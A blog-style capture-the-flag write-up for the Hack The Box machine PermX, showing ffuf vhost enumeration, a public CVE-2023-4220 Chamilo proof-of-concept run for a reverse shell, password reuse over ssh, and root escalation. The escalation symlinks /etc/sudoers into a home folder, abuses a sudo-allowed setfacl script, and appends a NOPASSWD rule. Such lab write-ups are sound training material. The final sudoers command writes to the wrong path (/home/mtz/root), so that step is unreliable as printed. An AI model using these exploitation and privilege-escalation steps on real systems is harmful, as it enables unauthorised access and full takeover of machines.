+++
title = "HTB - Permx"
date = "2024-11-16T00:00:00+00:00"
#dateFormat = "2006-01-02" # This value can be configured for per-post date formatting
author = "squ4r00t"
authorTwitter = "" #do not include @
cover = "/img/htb/permx/tn.png"
tags = ["ctf", "htb"]
keywords = ["", ""]
description = "Writeup for the 'Easy' rated machine: Permx"
showFullContent = false
readingTime = false
hideComments = false
+++

PermX is a 'Easy' rated machine where we get the foothold by exploiting, after some enumeration, a public CVE allowing us to upload arbitrary files to the server. After, that we find some database credentials in a configuration file. This password is re-used by a user on the box. Upon logging in as that user, we notice that they can run a bash script as root, allowing us to privesc to root.

## Nmap Results
___

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://permx.htb
```

We see that we have 2 ports open:
- 22 running ssh
- 80 running an Apache server redirecting to `http://permx.htb`

Let's add it to our host file.

## Foothold
___
Navigating to `http://permx.htb`:

{{<figure src="/img/htb/permx/main_web_page.png" position=center caption="Home Page">}}

After going through the different pages of site, we can notice that there nothing interesting here as there are only static pages and the form on the contact page doesn't send any data.

Let's see if the server has other vhosts

{{<code language="bash" title="Vhost enumeration using ffuf">}}
ffuf -u http://FUZZ.permx.htb -w ~/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://FUZZ.permx.htb
 :: Wordlist         : FUZZ: /home/squ4r00t/tools/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1242ms]
:: Progress: [114441/114441] :: Job [1/1] :: 10 req/sec :: Duration: [0:10:07] :: Errors: 114440 ::
{{</code>}}

We got `lms` as a vhost. Let's add it to our hosts file.

Navigating to `lms.permx.htb`, we see a web page powered by Chamilo

{{<figure src="/img/htb/permx/lms_page.png" position=center caption="lms.permx.htb powered by Chamilo">}}

After some research, we see that it is vulnerable to [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) which is an arbitrary file upload allowing any unauthenticated user to achieve RCE by uploading a PHP webshell to the site. This can be exploited with [this POC](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc).

{{<code language="bash" title="Running exploit POC">}}
# Installation / Setup
git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc.git
cd chamilo-lms-unauthenticated-big-upload-rce-poc/
pip install -r requirements.txt

# Exploitation (setup netcat listener before)
python3 main.py -u http://lms.permx.htb -a revshell
{{</code>}}

After running the script, we receive a shell on our netcat listener:

{{<figure src="/img/htb/permx/foothold_shell.png" position=center caption="Reverse shell">}}

## Privilege Escalation
___
### www-data -> mtz
___
Looking around the different files on the server, we notice some interesting ones in `/var/www/chamilo/app/config`, espacially `configuration.php` containing some database credentials:

{{<figure src="/img/htb/permx/db_creds.png" position=center caption="">}}

Under the `/home` directory we can find another user `mtz`. Let's try the password we found with this user:

```bash
ssh mtz@permx.htb
```

We successfully logged in and can now retrieve the user flag:

{{<figure src="/img/htb/permx/user_flag.png" position=center caption="User flag obtained !">}}

### mtz -> root
___
Enumerating our sudo privileges as `mtz`, we can see that we can run `/opt/acl.sh` as root:

{{<figure src="/img/htb/permx/sudo_privs.png" position=center caption="mtz's sudo privileges">}}

Let's see the content of the script:

{{<code language="bash" title="/opt/acl.sh">}}
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
{{</code>}}

This script takes 3 arguments:
- A user
- Permissions to set
- And a target file

But the catch is that we can only set permissions of files inside `/home/mtz` and we cannot use path traversal. We can still bypass these restrictions by making use of [symbolic links](https://en.wikipedia.org/wiki/Symbolic_link).

We will first create a symbolic link to the file we want to change the permissions of. In this case, we can target the sudoers file.

```bash
ln -s /etc/sudoers /home/mtz/sudoers
```

Now let's run the script as root and change the permissions on `/home/mtz/sudoers`

```bash
sudo /opt/acl.sh mtz rw /home/mtz/sudoers
```

We are now able to edit the sudoers file. From here we can easily escalate to root, an easy way to do it is:

```bash
echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" >> /home/mtz/root
sudo su
```

And then retrieve the root flag:

{{<figure src="/img/htb/permx/root_flag.png" position=center caption="Root flag obtained !">}}

